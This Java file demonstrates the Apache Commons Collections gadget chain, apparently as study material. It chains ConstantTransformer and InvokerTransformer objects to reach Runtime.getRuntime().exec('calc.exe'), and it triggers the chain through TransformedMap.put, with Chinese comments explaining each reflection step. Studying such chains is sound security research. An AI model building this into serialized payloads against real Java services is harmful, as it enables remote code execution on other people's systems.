package cc.saferoad.apachecc;/*
@auther S0cke3t
@date 2021-11-16
*/

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class TransformedMapTest {
    public static void main(String[] args) {
        String cmd = "calc.exe";
        Transformer[] transformers = new Transformer[]{
                // 获取java.lang.runtime类
                new ConstantTransformer(Runtime.class),
                //反射获取getRuntime
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                //反射获取getRuntime实例
                new InvokerTransformer("invoke",new Class[]{
                        Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                //执行exec
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{cmd})
        };

        Transformer transformedChain = new ChainedTransformer(transformers);
        //创建一个Map对象
        Map map = new HashMap();
        map.put("key","value");
        Map tranformedMap = TransformedMap.decorate(map,null,transformedChain);
        tranformedMap.put("k2","v2");
        System.out.println(tranformedMap);
    }
}
